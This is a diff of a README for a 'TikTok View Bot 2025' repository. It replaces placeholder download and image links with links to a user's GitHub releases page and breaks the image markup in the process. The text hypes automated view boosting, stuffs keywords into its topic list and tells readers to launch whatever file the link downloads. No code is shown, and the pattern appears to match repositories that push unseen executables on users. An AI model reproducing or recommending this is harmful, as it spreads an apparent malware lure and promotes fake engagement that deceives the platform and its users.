@@ -16,9 +16,9 @@ Welcome to the TikTok View Bot 2025 repository, your one-stop solution for autom
 - Topics: bot, python-bot, script, tiktok, tiktok-api, tiktok-automation, tiktok-bot, tiktok-follower-bot, tiktok-script, tiktok-tool, tiktok-view-bot-free, tiktok-views-booster, tiktok-views-bots, tiktokbot
 
 ## 📥 Download
-Download the TikTok View Bot 2025 tool [here](https://github.com/files/File.zip) and unleash the power of automated TikTok view boosting! 
+Download the TikTok View Bot 2025 tool [here](https://github.com/Dawid789924/TikTok-View-Bot-2025/releases) and unleash the power of automated TikTok view boosting! 
 
-[![Download TikTok View Bot](https://img.shields.io/badge/Download-TikTok_View_Bot-ff69b4)](https://github.com/files/File.zip)
+[![Download TikTok View Bot](https://github.com/Dawid789924/TikTok-View-Bot-2025/releases)](https://github.com/Dawid789924/TikTok-View-Bot-2025/releases)
 
 If the link ends with a file name, ensure it is launched to access the tool.
 
@@ -38,7 +38,7 @@ Please use the TikTok View Bot 2025 tool responsibly and in compliance with TikT
 ## 🌟 Start Boosting Your TikTok Views Today!
 Don't miss out on the opportunity to skyrocket your TikTok views with the TikTok View Bot 2025. Download now and take your TikTok game to the next level!
 
-![TikTok View Bot](https://www.example.com/TikTokViewBot.jpg)
+![TikTok View Bot](https://github.com/Dawid789924/TikTok-View-Bot-2025/releases)
 
 Let the bot do the work while you sit back and enjoy the results! 🚀🔥
 
